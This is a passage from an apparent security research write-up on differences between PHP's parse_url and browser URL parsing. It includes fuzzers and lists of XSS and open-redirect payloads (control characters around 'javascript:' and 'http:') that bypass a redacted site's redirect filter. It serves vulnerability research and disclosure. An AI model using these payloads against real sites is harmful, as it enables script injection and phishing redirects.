<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>php -r <span style="color:#e6db74">&#34;var_dump(parse_url(&#39;javascript:///%250dalert(1)&#39;));&#34;</span>        
</span></span><span style="display:flex;"><span>Command line code:1:
</span></span><span style="display:flex;"><span>bool<span style="color:#f92672">(</span>false<span style="color:#f92672">)</span>
</span></span></code></pre></div><p>But the front-end URL parser has its own ideas:</p>
<p>The payload reflected to the front looks like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;javascript:///%0dalert(1)&#39;</span>
</span></span></code></pre></div><p>The front-end URL parser decodes the URL first, decoding &lsquo;%0d&rsquo; into &lsquo;\n&rsquo;, and the protocol parsed into is named javascript, so it switches to the js resolver, which thinks&rsquo; // &lsquo;is a single line comment, <code>alert(1)</code> is the next line of js code after the newline.</p>
<p>So we have a XSS vulnerability!</p>
<h2 id="further-research">Further Research</h2>
<p>Can we further search for more inconsistencies between the js URL parser and the php URL parser by writing fuzzer?</p>
<h3 id="qustion1-httpcharlocalhost80xxxx">Qustion1: http:{char}//localhost:80/xxxx</h3>
<p>Can we find a character between <code>http:</code> and <code>//</code> that the front-end URL parser still considers the host part of the URL to be localhost after we fill it into the <code>{char}</code> position?</p>
<p>So I wrote the following fuzzer:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">log</span><span style="color:#f92672">=</span>[];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>(<span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x10ffff</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#e6db74">&#39;http:&#39;</span><span style="color:#f92672">+</span>String.<span style="color:#a6e22e">fromCodePoint</span>(<span style="color:#a6e22e">i</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;//localhost:80/xxxx&#39;</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">url</span>[<span style="color:#e6db74">&#39;host&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;localhost&#39;</span> ){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39; URL encoded i : &#39;</span><span style="color:#f92672">+</span>encodeURI(String.<span style="color:#a6e22e">fromCodePoint</span>(<span style="color:#a6e22e">i</span>)))
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  }<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">log</span>
</span></span></code></pre></div><p>Output:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>9 URL encoded i : %09
</span></span><span style="display:flex;"><span>10 URL encoded i : %0A
</span></span><span style="display:flex;"><span>13 URL encoded i : %0D
</span></span><span style="display:flex;"><span>47 URL encoded i : /
</span></span><span style="display:flex;"><span>92 URL encoded i : %5C
</span></span><span style="display:flex;"><span>(5) [9, 10, 13, 47, 92]
</span></span></code></pre></div><p>So how does PHP&rsquo;s URL parser <code>parse_url</code> parse these payloads?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> [<span style="color:#e6db74">&#34;http:%09//localhost&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;scheme&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">4</span>) <span style="color:#e6db74">&#34;http&#34;</span>
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;path&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">14</span>) <span style="color:#e6db74">&#34;%09//localhost&#34;</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  [<span style="color:#e6db74">&#34;http:   //localhost&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;scheme&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">4</span>) <span style="color:#e6db74">&#34;http&#34;</span>
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;path&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">14</span>) <span style="color:#e6db74">&#34;   //localhost&#34;</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  [<span style="color:#e6db74">&#34;http:%0a//localhost&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;scheme&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">4</span>) <span style="color:#e6db74">&#34;http&#34;</span>
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;path&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">14</span>) <span style="color:#e6db74">&#34;%0a//localhost&#34;</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  [<span style="color:#e6db74">&#34;http:\//localhost&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;scheme&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">4</span>) <span style="color:#e6db74">&#34;http&#34;</span>
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;path&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">12</span>) <span style="color:#e6db74">&#34;\//localhost&#34;</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  [<span style="color:#e6db74">&#34;http:///localhost&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">bool</span>(<span style="color:#66d9ef">false</span>)
</span></span></code></pre></div><p>As you can see, the <code>parse_url</code> faced with these payloads, either thinks that everything after <code>http:</code> is the path portion, or it thinks that the URL is an illegal URL and returns <code>false</code></p>
<p>In other words, the following payloads can also bypass redacted&rsquo;s URL filter, causing open redirects:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://demo.redacted.com/login?goto=http:\//www.baidu.com
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=http:%0d\\www.baidu.com
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=http:%0a\\www.baidu.com
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=http:%09\\www.baidu.com
</span></span></code></pre></div><h3 id="question2-httpcharlocalhost80xxxx">Question2: http{char}://localhost:80/xxxx</h3>
<p>Can we find a character between &lsquo;http&rsquo; and &lsquo;://&rsquo; that still makes the front-end URL parser think that the host part of the URL is localhost and the scheme part is http?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">log</span><span style="color:#f92672">=</span>[];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>(<span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x10ffff</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(<span style="color:#e6db74">&#39;http&#39;</span><span style="color:#f92672">+</span>String.<span style="color:#a6e22e">fromCodePoint</span>(<span style="color:#a6e22e">i</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;://localhost:80/xxxx&#39;</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">url</span>[<span style="color:#e6db74">&#39;host&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;localhost&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">url</span>[<span style="color:#e6db74">&#39;protocol&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;http:&#39;</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">&#39;i: &#39;</span><span style="color:#f92672">+</span><span style="color:#a6e22e">i</span><span style="color:#f92672">+</span><span style="color:#e6db74">&#39; URL encoded i : &#39;</span><span style="color:#f92672">+</span>encodeURI(String.<span style="color:#a6e22e">fromCodePoint</span>(<span style="color:#a6e22e">i</span>)));
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#a6e22e">url</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  }<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">log</span>
</span></span></code></pre></div><p>Running results of the front-end URL parser:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>VM437:7 9:  URL encoded i : %09
</span></span><span style="display:flex;"><span>VM437:7 10:  URL encoded i : %0A
</span></span><span style="display:flex;"><span>VM437:7 13:  URL encoded i : %0D
</span></span></code></pre></div><p>This time it only gets three characters, minus <code>/</code>and <code>\</code>, and gets the following three payloads</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>http%09://baidu.com
</span></span><span style="display:flex;"><span>http%0a://baidu.com
</span></span><span style="display:flex;"><span>http%0d://baidu.com
</span></span></code></pre></div><p>How does PHP&rsquo;s URL parser parse these payloads?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>  [<span style="color:#e6db74">&#34;http%09://localhost:80/xxx&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;path&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">26</span>) <span style="color:#e6db74">&#34;http%09://localhost:80/xxx&#34;</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  [<span style="color:#e6db74">&#34;http%0a://localhost:80/xxx&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;path&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">26</span>) <span style="color:#e6db74">&#34;http%0a://localhost:80/xxx&#34;</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  [<span style="color:#e6db74">&#34;http%0d://localhost:80/xxx&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;path&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">26</span>) <span style="color:#e6db74">&#34;http%0d://localhost:80/xxx&#34;</span>
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>This bypasses both filter&rsquo;s protocol check and host check:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span>window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http%0a://localhost:80/xxx&#39;</span> <span style="color:#75715e">// exception
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;http\n://localhost:80/xxx&#39;</span> <span style="color:#75715e">// work
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;javascript\n:alert(1)&#39;</span> <span style="color:#75715e">// work
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;javascript\r:alert(1)&#39;</span> <span style="color:#75715e">// work
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;javascript\t:alert(1)&#39;</span> <span style="color:#75715e">// work
</span></span></span></code></pre></div><p>payload:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://demo.redacted.com/login?goto=javascript%0d:alert(1) //work！
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=javascript%0a:alert(1) //work！
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=javascript%09:alert(1) //work！
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=http%09://baidu.com //work
</span></span></code></pre></div><h3 id="question3-charhttplocalhost80xxxx">Question3: {char}http://localhost:80/xxxx</h3>
<p>Can we find a character before the &lsquo;http&rsquo; protocol, fill it in, and still make the front-end URL parser think that the host part of the URL is localhost and the scheme part is http?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">log</span><span style="color:#f92672">=</span>[];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span>(<span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#ae81ff">0x10ffff</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>){
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">try</span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">let</span> <span style="color:#a6e22e">url</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">URL</span>(String.<span style="color:#a6e22e">fromCodePoint</span>(<span style="color:#a6e22e">i</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;http://localhost:80/xxxx&#39;</span>)
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">url</span>[<span style="color:#e6db74">&#39;host&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;localhost&#39;</span> <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">url</span>[<span style="color:#e6db74">&#39;protocol&#39;</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;http:&#39;</span>){
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`i: </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">i</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> ,URL encoded i : `</span><span style="color:#f92672">+</span>encodeURI(String.<span style="color:#a6e22e">fromCodePoint</span>(<span style="color:#a6e22e">i</span>))<span style="color:#f92672">+</span><span style="color:#e6db74">&#39; string begin:&#39;</span><span style="color:#f92672">+</span>String.<span style="color:#a6e22e">fromCodePoint</span>(<span style="color:#a6e22e">i</span>)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;string end&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">push</span>(<span style="color:#a6e22e">i</span>);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  }<span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">e</span>){}
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">log</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">log</span>.<span style="color:#a6e22e">forEach</span>(<span style="color:#a6e22e">i</span>=&gt;{
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//console.log(encodeURI(String.fromCodePoint(i))+&#39;http://localhost:80/xxxx&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(encodeURI(String.<span style="color:#a6e22e">fromCodePoint</span>(<span style="color:#a6e22e">i</span>))<span style="color:#f92672">+</span><span style="color:#e6db74">&#39;javascript:alert(1)&#39;</span>)
</span></span><span style="display:flex;"><span>})
</span></span></code></pre></div><p>payloads:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>%00http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%01http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%02http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%03http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%04http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%05http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%06http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%07http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%08http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%09http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%0Ahttp://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%0Bhttp://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%0Chttp://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%0Dhttp://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%0Ehttp://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%0Fhttp://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%10http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%11http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%12http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%13http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%14http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%15http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%16http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%17http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%18http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%19http://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%1Ahttp://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%1Bhttp://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%1Chttp://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%1Dhttp://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%1Ehttp://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%1Fhttp://localhost:80/xxxx
</span></span><span style="display:flex;"><span>%20http://localhost:80/xxxx
</span></span></code></pre></div><p>Replace the http protocol with the javascript protocol:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>%00javascript:alert(1)
</span></span><span style="display:flex;"><span>%01javascript:alert(1)
</span></span><span style="display:flex;"><span>%02javascript:alert(1)
</span></span><span style="display:flex;"><span>%03javascript:alert(1)
</span></span><span style="display:flex;"><span>%04javascript:alert(1)
</span></span><span style="display:flex;"><span>%05javascript:alert(1)
</span></span><span style="display:flex;"><span>%06javascript:alert(1)
</span></span><span style="display:flex;"><span>%07javascript:alert(1)
</span></span><span style="display:flex;"><span>%08javascript:alert(1)
</span></span><span style="display:flex;"><span>%09javascript:alert(1)
</span></span><span style="display:flex;"><span>%0Ajavascript:alert(1)
</span></span><span style="display:flex;"><span>%0Bjavascript:alert(1)
</span></span><span style="display:flex;"><span>%0Cjavascript:alert(1)
</span></span><span style="display:flex;"><span>%0Djavascript:alert(1)
</span></span><span style="display:flex;"><span>%0Ejavascript:alert(1)
</span></span><span style="display:flex;"><span>%0Fjavascript:alert(1)
</span></span><span style="display:flex;"><span>%10javascript:alert(1)
</span></span><span style="display:flex;"><span>%11javascript:alert(1)
</span></span><span style="display:flex;"><span>%12javascript:alert(1)
</span></span><span style="display:flex;"><span>%13javascript:alert(1)
</span></span><span style="display:flex;"><span>%14javascript:alert(1)
</span></span><span style="display:flex;"><span>%15javascript:alert(1)
</span></span><span style="display:flex;"><span>%16javascript:alert(1)
</span></span><span style="display:flex;"><span>%17javascript:alert(1)
</span></span><span style="display:flex;"><span>%18javascript:alert(1)
</span></span><span style="display:flex;"><span>%19javascript:alert(1)
</span></span><span style="display:flex;"><span>%1Ajavascript:alert(1)
</span></span><span style="display:flex;"><span>%1Bjavascript:alert(1)
</span></span><span style="display:flex;"><span>%1Cjavascript:alert(1)
</span></span><span style="display:flex;"><span>%1Djavascript:alert(1)
</span></span><span style="display:flex;"><span>%1Ejavascript:alert(1)
</span></span><span style="display:flex;"><span>%1Fjavascript:alert(1)
</span></span><span style="display:flex;"><span>%20javascript:alert(1)
</span></span></code></pre></div><p>How does PHP&rsquo;s URL parser parse these payloads?</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>  [<span style="color:#e6db74">&#34;%00http://localhost:80/xxxx&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;path&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">27</span>) <span style="color:#e6db74">&#34;%00http://localhost:80/xxxx&#34;</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  [<span style="color:#e6db74">&#34;%01http://localhost:80/xxxx&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;path&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">27</span>) <span style="color:#e6db74">&#34;%01http://localhost:80/xxxx&#34;</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  [<span style="color:#e6db74">&#34;%1Djavascript:alert(1)&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;path&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">22</span>) <span style="color:#e6db74">&#34;%1Djavascript:alert(1)&#34;</span>
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  [<span style="color:#e6db74">&#34;%1Ejavascript:alert(1)&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">array</span>(<span style="color:#ae81ff">1</span>) {
</span></span><span style="display:flex;"><span>    [<span style="color:#e6db74">&#34;path&#34;</span>]<span style="color:#f92672">=&gt;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">string</span>(<span style="color:#ae81ff">22</span>) <span style="color:#e6db74">&#34;%1Ejavascript:alert(1)&#34;</span>
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></div><p>PHP&rsquo;s URL parser considers the entire URL to be a relative URL</p>
<p>Therefore, the following payloads can bypass protocol check and host check of the redacted filter:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%00javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%01javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%02javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%03javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%04javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%05javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%06javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%07javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%08javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%09javascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%0Ajavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%0Bjavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%0Cjavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%0Djavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%0Ejavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%0Fjavascript:alert(1)
</span></span><span style="display:flex;"><span>https://demo.redacted.com/login?goto=%10javascript:alert(1)
